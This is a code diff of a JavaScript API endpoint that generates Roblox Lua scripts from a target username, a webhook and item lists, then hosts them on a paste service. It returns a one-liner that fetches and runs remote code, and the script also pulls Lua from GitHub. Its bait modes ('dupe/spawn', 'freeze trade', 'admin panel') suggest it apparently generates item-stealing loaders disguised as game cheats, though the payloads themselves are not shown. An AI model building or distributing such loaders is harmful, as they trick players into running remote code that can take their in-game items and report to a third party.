@@ -2,61 +2,39 @@
 // api/generate.js
 
 export default async function handler(req, res) {
+    if (req.method !== 'POST') {
+        return res.status(405).json({
+            error: 'Method not allowed'
+        });
+    }
+
+    const {
+        username,
+        webhook,
+        mode,
+        brainrots,
+        skins,
+        gears,
+        customCode,
+        userId
+    } = req.body || {};
+
+    if (!username) {
+        return res.status(400).json({
+            error: 'Username is required'
+        });
+    }
+
     try {
-        console.log("=== /api/generate START ===");
-
-        console.log("Method:", req.method);
-        console.log("Body:", req.body);
-
-        if (req.method !== 'POST') {
-            return res.status(405).json({
-                error: 'Method not allowed'
-            });
-        }
-
-        const body = req.body || {};
-
-        const {
-            username,
-            webhook,
-            mode,
-            brainrots,
-            skins,
-            gears,
-            customCode,
-            userId
-        } = body;
-
-        console.log("username:", username);
-        console.log("mode:", mode);
-        console.log("brainrots:", brainrots);
-        console.log("skins:", skins);
-        console.log("gears:", gears);
-        console.log("customCode:", !!customCode);
-        console.log("userId:", userId);
-
-        if (!username) {
-            return res.status(400).json({
-                error: 'Username is required'
-            });
-        }
-
-        console.log("Calling buildScript...");
-
         const script = buildScript(
             username,
             webhook,
             mode,
-            Array.isArray(brainrots) ? brainrots : [],
-            Array.isArray(skins) ? skins : [],
-            Array.isArray(gears) ? gears : [],
+            brainrots || [],
+            skins || [],
+            gears || [],
             customCode || ''
         );
-
-        console.log("buildScript OK");
-        console.log("Script length:", script.length);
-
-        console.log("Calling saveToInternalPaste...");
 
         const pasteId = await saveToInternalPaste(
             script,
@@ -64,49 +42,32 @@ export default async function handler(req, res) {
             userId
         );
 
-        console.log("saveToInternalPaste OK");
-        console.log("pasteId:", pasteId);
-
         const baseUrl =
             process.env.BASE_URL || 'https://oblivionhub.xyz';
 
         const rawUrl =
             `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
 
-        console.log("rawUrl:", rawUrl);
-
         return res.status(200).json({
-            loadstring:
-                `loadstring(game:HttpGet("${rawUrl}"))()`,
-
-            script,
-
+            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
+            script: script,
             pasteUrl: rawUrl,
-
-            pasteId,
-
+            pasteId: pasteId,
             obfuscated: false
         });
 
     } catch (error) {
-
-        console.error("================================");
-        console.error("GENERATE ERROR");
-        console.error("================================");
-
-        console.error("Name:", error?.name);
-        console.error("Message:", error?.message);
-        console.error("Stack:", error?.stack);
+        console.error('Error general:', error);
 
         return res.status(500).json({
-            error: error?.message || 'Internal server error'
+            error: error.message || 'Internal server error'
         });
     }
 }
 
 
 // ============================================================
-// BUILD SCRIPT
+// CONSTRUIR SCRIPT
 // ============================================================
 
 function buildScript(
@@ -119,8 +80,6 @@ function buildScript(
     customCode
 ) {
 
-    console.log("buildScript mode:", mode);
-
     function luaTable(arr, indent = '    ') {
 
         if (!Array.isArray(arr) || arr.length === 0) {
@@ -128,7 +87,6 @@ function buildScript(
         }
 
         const items = arr.map(item => {
-
             const value = String(item)
                 .replace(/\\/g, '\\\\')
                 .replace(/"/g, '\\"');
@@ -146,18 +104,15 @@ function buildScript(
     }
 
 
-    const safeUsername =
-        String(username)
+    const safeUsername = String(username)
+        .replace(/\\/g, '\\\\')
+        .replace(/"/g, '\\"');
+
+    const safeWebhook = webhook
+        ? String(webhook)
             .replace(/\\/g, '\\\\')
-            .replace(/"/g, '\\"');
-
-
-    const safeWebhook =
-        webhook
-            ? String(webhook)
-                .replace(/\\/g, '\\\\')
-                .replace(/"/g, '\\"')
-            : 'WEBHOOK_URL';
+            .replace(/"/g, '\\"')
+        : 'WEBHOOK_URL';
 
 
     let script =
@@ -189,7 +144,6 @@ function buildScript(
     // ========================================================
 
     const GUI_GITHUB = {
-
         adminpanel:
             'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',
 
@@ -208,7 +162,6 @@ function buildScript(
     if (mode === 'normal') {
 
         script += `
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
@@ -218,14 +171,12 @@ end)`;
 
     // ========================================================
     // ADMIN PANEL
+    // LUARMOR + GUIAP.LUA
     // ========================================================
 
     else if (mode === 'adminpanel') {
 
         script += `
-
--- GUI ADMIN PANEL
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)
@@ -239,14 +190,12 @@ end)`;
 
     // ========================================================
     // DUPE / SPAWN
+    // LUARMOR + GUIDUPE.LUA
     // ========================================================
 
     else if (mode === 'dupespawn') {
 
         script += `
-
--- GUI DUPE / SPAWN
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)
@@ -260,14 +209,12 @@ end)`;
 
     // ========================================================
     // CODE SNIPER
+    // LUARMOR + SNIPER.LUA
     // ========================================================
 
     else if (mode === 'codesniper') {
 
         script += `
-
--- GUI CODE SNIPER
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)
@@ -286,7 +233,6 @@ end)`;
     else if (mode === 'freezetrade') {
 
         script += `
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
@@ -301,16 +247,11 @@ end)`;
     else if (mode === 'custom') {
 
         script += `
-
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
 
-
-        if (
-            customCode &&
-            String(customCode).trim()
-        ) {
+        if (customCode && String(customCode).trim()) {
 
             const formattedCustomCode =
                 String(customCode)
@@ -325,6 +266,10 @@ end)`;
     }
 
 
+    // ========================================================
+    // MODO DESCONOCIDO
+    // ========================================================
+
     else {
 
         throw new Error(
@@ -338,7 +283,7 @@ end)`;
 
 
 // ============================================================
-// SAVE PASTE
+// GUARDAR EN PASTEFY INTERNO
 // ============================================================
 
 async function saveToInternalPaste(
@@ -349,11 +294,6 @@ async function saveToInternalPaste(
 
     const baseUrl =
         process.env.BASE_URL || 'https://oblivionhub.xyz';
-
-    console.log(
-        "saveToInternalPaste URL:",
-        `${baseUrl}/api/paste`
-    );
 
 
     const response = await fetch(
@@ -366,7 +306,7 @@ async function saveToInternalPaste(
             },
 
             body: JSON.stringify({
-                content,
+                content: content,
                 title: title || 'Untitled',
                 userId: userId || null,
                 public: true
@@ -375,20 +315,30 @@ async function saveToInternalPaste(
     );
 
 
-    console.log(
-        "Paste response status:",
-        response.status
-    );
-
-
     if (!response.ok) {
 
-        const text =
-            await response.text();
+        let errorMessage =
+            'Error al guardar el paste';
 
-        throw new Error(
-            `Paste API error ${response.status}: ${text}`
-        );
+        try {
+
+            const error =
+                await response.json();
+
+            errorMessage =
+                error.error || errorMessage;
+
+        } catch (_) {
+
+            const text =
+                await response.text();
+
+            if (text) {
+                errorMessage = text;
+            }
+        }
+
+        throw new Error(errorMessage);
     }
 
 
